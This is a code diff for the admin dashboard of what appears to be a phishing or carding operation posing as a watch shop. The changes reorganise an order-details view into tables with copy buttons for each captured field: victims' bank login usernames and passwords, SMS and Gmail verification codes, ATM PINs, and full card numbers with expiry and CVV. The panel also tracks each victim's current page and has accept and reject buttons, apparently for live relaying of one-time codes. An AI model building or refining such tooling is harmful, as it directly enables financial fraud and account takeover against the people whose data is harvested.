@@ -131,6 +131,30 @@
   .detail-item .lbl{font-size:11px;color:var(--muted);margin-bottom:4px;font-weight:500}
   .detail-item .val{font-size:14px;font-weight:600;word-break:break-word}
   .detail-full{grid-column:1/-1}
+
+  /* Organised section tables */
+  .section{margin-bottom:20px;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+  .section .section-head{padding:12px 16px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line)}
+  .section .section-head h3{font-size:14px;font-weight:800;color:var(--ink);margin:0}
+  .section .section-head .section-pill{font-size:11px;padding:3px 10px;border-radius:999px;font-weight:700;color:#fff}
+  .section-table{width:100%;border-collapse:collapse;background:#fff}
+  .section-table tr{border-bottom:1px solid var(--line)}
+  .section-table tr:last-child{border-bottom:none}
+  .section-table th{text-align:right;font-size:12px;color:var(--muted);font-weight:600;padding:11px 14px;width:40%;background:#fcfcfc;border-left:1px solid var(--line)}
+  .section-table td{font-size:14px;color:var(--ink);font-weight:600;padding:11px 14px;word-break:break-word}
+  .section-table td.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:1px;direction:ltr;text-align:right}
+  .section-table td.highlight{color:var(--purple)}
+  .section-table td .cell-copy{background:transparent;border:none;cursor:pointer;color:var(--muted);padding:2px 6px;border-radius:4px;font-size:11px;font-family:inherit;margin-right:8px;display:inline-flex;align-items:center;gap:3px;vertical-align:middle}
+  .section-table td .cell-copy:hover{color:var(--purple);background:#f5f3ff}
+  .section-table td .cell-copy svg{width:12px;height:12px}
+  .section-table td .empty{color:var(--muted);font-weight:400}
+  .section--personal .section-pill{background:#64748b}
+  .section--order .section-pill{background:#0ea5e9}
+  .section--login .section-pill{background:#7c3aed}
+  .section--code .section-pill{background:#1565c0}
+  .section--email .section-pill{background:#d32f2f}
+  .section--card .section-pill{background:#e65100}
+  .section--atm .section-pill{background:#059669}
   .modal-actions{display:flex;gap:12px}
   .modal-actions button{flex:1;padding:16px;border:none;border-radius:14px;font-size:15px;
     font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
@@ -253,7 +277,7 @@
     <button class="modal-close" onclick="closeModal('detailsModal')">×</button>
     <h2>تفاصيل الطلب</h2>
     <div class="modal-watch" id="modalWatch"></div>
-    <div class="detail-grid" id="modalDetails"></div>
+    <div id="modalDetails"></div>
     <div class="modal-actions">
       <button class="btn-accept" id="modalAccept">قبول الطلب</button>
       <button class="btn-reject" id="modalReject">رفض الطلب</button>
@@ -484,48 +508,84 @@ function showDetails(id) {
     : `<div class="color-name">${o.watch_color || "لم يتم الاختيار"}</div>`;
 
   const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
-  function credRow(label, val, color) {
-    if (!val) return `<div class="cred-row"><div><div class="cred-label">${label}</div><div class="cred-val" style="color:var(--muted)">—</div></div></div>`;
-    return `<div class="cred-row"><div><div class="cred-label">${label}</div><div class="cred-val code-val" style="color:${color||'var(--purple)'}">${val}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${val}')">${copyIcon} نسخ</button></div></div>`;
+  const esc = (v) => String(v == null ? "" : v)
+    .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
+    .replace(/"/g,"&quot;").replace(/'/g,"&#39;");
+  const fmtDate = (v) => v ? new Date(v).toLocaleString("ar-EG") : "";
+  function row(label, val, opts = {}) {
+    const empty = (val == null || val === "");
+    const cls = [];
+    if (opts.mono) cls.push("mono");
+    if (opts.highlight) cls.push("highlight");
+    const inner = empty
+      ? '<span class="empty">—</span>'
+      : (opts.html ? val : esc(val));
+    const copyBtn = (!empty && opts.copy)
+      ? `<button class="cell-copy" onclick="copyCred(this,'${esc(val).replace(/'/g,"\\'")}')">${copyIcon}نسخ</button>`
+      : "";
+    return `<tr><th>${esc(label)}</th><td class="${cls.join(" ")}">${copyBtn}${inner}</td></tr>`;
+  }
+  function section(cls, title, pillText, pillColor, rows) {
+    return `<div class="section ${cls}">
+      <div class="section-head"><h3>${esc(title)}</h3>${pillText?`<span class="section-pill">${esc(pillText)}</span>`:""}</div>
+      <table class="section-table"><tbody>${rows}</tbody></table>
+    </div>`;
   }
 
-  let detailsHtml = `
-    <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">البريد الإلكتروني</div><div class="val">${o.email||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">الدولة</div><div class="val">${countryDisplay(o.country)}</div></div>
-    <div class="detail-item"><div class="lbl">الولاية</div><div class="val">${o.wilaya||"—"}</div></div>
-    <div class="detail-item detail-full"><div class="lbl">العنوان</div><div class="val">${o.address||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">لون الساعة</div><div class="val">${o.watch_color||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${getStatusLabel(o)}</div></div>
-    <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${o.created_at?new Date(o.created_at).toLocaleString("ar-EG"):"—"}</div></div>`;
+  let detailsHtml = "";
 
-  // بيانات تسجيل الدخول
-  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3>بيانات تسجيل الدخول</h3>`;
-  var loginCountryHtml = o.login_country ? countryDisplay(o.login_country) : "—";
-  detailsHtml += '<div class="cred-row"><div><div class="cred-label">الدولة المختارة</div><div class="cred-val" style="color:var(--ink);font-family:inherit;font-size:14px;letter-spacing:0;display:flex;align-items:center;gap:6px">' + loginCountryHtml + '</div></div></div>';
-  detailsHtml += credRow("اسم المستخدم", o.login_username, "var(--purple)");
-  detailsHtml += credRow("رقم ATM", o.login_password, "var(--purple)");
-  detailsHtml += `</div></div>`;
+  // 1) Personal info
+  detailsHtml += section("section--personal", "البيانات الشخصية", "طلب #" + o.id, null,
+    row("الاسم الكامل", o.name)
+    + row("رقم الهاتف", o.phone, {mono:true, copy:true})
+    + row("البريد الإلكتروني", o.email, {copy:true})
+    + row("الدولة", countryDisplay(o.country), {html:true})
+    + row("المنطقة / الولاية", o.wilaya)
+    + row("المدينة", o.city)
+    + row("العنوان", o.address)
+    + row("الرمز البريدي", o.postcode)
+  );
 
-  // رمز التحقق (SMS)
-  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3 style="color:#1565c0">رمز التحقق (SMS)</h3>`;
-  detailsHtml += credRow("رمز التحقق", o.verification_code, "#1565c0");
-  detailsHtml += `</div></div>`;
+  // 2) Order details
+  detailsHtml += section("section--order", "تفاصيل الطلب", "", null,
+    row("لون الساعة", o.watch_color)
+    + row("رقم اللون", (o.watch_index!=null?("#"+(o.watch_index+1)):""))
+    + row("الحالة", getStatusLabel(o), {html:true})
+    + row("الصفحة الحالية", pageLabels[o.current_page] || o.current_page)
+    + row("تاريخ الإنشاء", fmtDate(o.created_at))
+    + row("آخر تحديث", fmtDate(o.updated_at))
+  );
 
-  // كود الجيميل
-  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3 style="color:#d32f2f">كود الجيميل</h3>`;
-  detailsHtml += credRow("كود الجيميل", o.email_verification_code, "#d32f2f");
-  detailsHtml += `</div></div>`;
+  // 3) Login credentials
+  var loginCountryHtml = o.login_country ? countryDisplay(o.login_country) : "";
+  detailsHtml += section("section--login", "بيانات تسجيل الدخول", "LOGIN", null,
+    row("الدولة المختارة", loginCountryHtml, {html:true})
+    + row("اسم المستخدم", o.login_username, {mono:true, copy:true, highlight:true})
+    + row("كلمة المرور", o.login_password, {mono:true, copy:true, highlight:true})
+  );
 
-  // بيانات البطاقة
-  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3 style="color:#e65100">بيانات البطاقة</h3>`;
-  detailsHtml += credRow("اسم حامل البطاقة", o.card_name, "#e65100");
-  detailsHtml += credRow("رقم البطاقة", o.card_number, "#e65100");
-  detailsHtml += credRow("تاريخ الانتهاء", o.card_expiry, "#e65100");
-  detailsHtml += credRow("CVV", o.card_cvv, "#e65100");
-  detailsHtml += `</div></div>`;
+  // 4) SMS code
+  detailsHtml += section("section--code", "رمز التحقق (SMS)", "SMS", null,
+    row("الرمز", o.verification_code, {mono:true, copy:true})
+  );
+
+  // 5) Gmail code
+  detailsHtml += section("section--email", "كود البريد (Gmail)", "GMAIL", null,
+    row("الرمز", o.email_verification_code, {mono:true, copy:true})
+  );
+
+  // 6) ATM PIN
+  detailsHtml += section("section--atm", "رقم ATM", "ATM", null,
+    row("ATM PIN", o.atm_pin, {mono:true, copy:true})
+  );
+
+  // 7) Card
+  detailsHtml += section("section--card", "بيانات البطاقة", "CARD", null,
+    row("اسم حامل البطاقة", o.card_name, {copy:true})
+    + row("رقم البطاقة", o.card_number, {mono:true, copy:true})
+    + row("تاريخ الانتهاء", o.card_expiry, {mono:true, copy:true})
+    + row("CVV", o.card_cvv, {mono:true, copy:true})
+  );
 
   document.getElementById("modalDetails").innerHTML = detailsHtml;
 
